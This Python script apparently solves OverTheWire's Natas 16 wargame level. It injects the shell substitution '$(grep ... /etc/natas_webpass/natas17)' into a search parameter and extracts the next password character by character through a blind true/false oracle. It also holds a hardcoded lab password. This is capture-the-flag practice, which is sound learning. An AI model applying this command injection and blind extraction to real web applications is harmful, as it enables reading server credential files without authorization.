import requests
from requests.auth import HTTPBasicAuth
import json

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered_chars = ''
passwordlist= []
exists_str = "Sunday"

url = 'http://natas16.natas.labs.overthewire.org/'
#http://natas16.natas.labs.overthewire.org/index.php?needle=Sunday%24%28grep+b+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search

natas_usr   = 'natas16'
natas_pword = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

####Find the list of chars in pword
##for ch in chars:
##    #url_joined = ''.join([url,'index.php?needle=Sunday%24%28grep+',ch, '+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'])
##    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Sunday$(grep ' + ch + ' /etc/natas_webpass/natas17)', auth=(natas_usr,natas_pword))
##    if exists_str not in r.text:
##        passwordlist.append(ch)
##        print("Password Dictionary: " + json.dumps(passwordlist))
##    else : print(ch + " is not in the password")
##

# List is: ["a", "e", "f", "i", "j", "l", "o", "p", "t", "u", "v", "x", "y", "z", "B", "C", "D", "E", "F", "I", "J", "K", "L", "M", "O", "R", "T", "U", "V", "X", "Y", "Z", "1", "2", "4", "6"]

passwordlist = ["b", "c", "d", "g", "h", "k", "m", "n", "q", "r", "s", "w", "A", "G", "H", "N", "P", "Q", "S", "W", "0", "3", "5", "7", "8", "9"]

# Test the possible chars in order:
password = ''

for i in range(1,33):
    for ch in passwordlist:
        crt_pword = ''.join([password,ch])
        #update to match other natas script
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Sunday$(grep ^' + crt_pword + ' /etc/natas_webpass/natas17)', auth=(natas_usr,natas_pword))
        if exists_str not in r.text:
            password = crt_pword
            print("Password " + str(i) + ": " + password )
            break
